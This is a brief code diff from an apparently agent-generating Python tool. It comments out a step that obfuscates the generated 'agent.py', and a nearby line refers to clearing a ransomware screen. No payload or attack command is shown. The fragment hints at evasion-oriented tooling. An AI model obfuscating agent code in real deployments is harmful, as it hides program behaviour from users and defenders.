@@ -1502,7 +1502,7 @@ result = "Ransomware screen cleared and Explorer restarted"
             )
 
             # Apply obfuscation
-            agent_code = _obfuscate_code(agent_code)
+            #agent_code = _obfuscate_code(agent_code)
 
             agent_path = os.path.join(agents_dir, 'agent.py')
             with open(agent_path, 'w') as f:
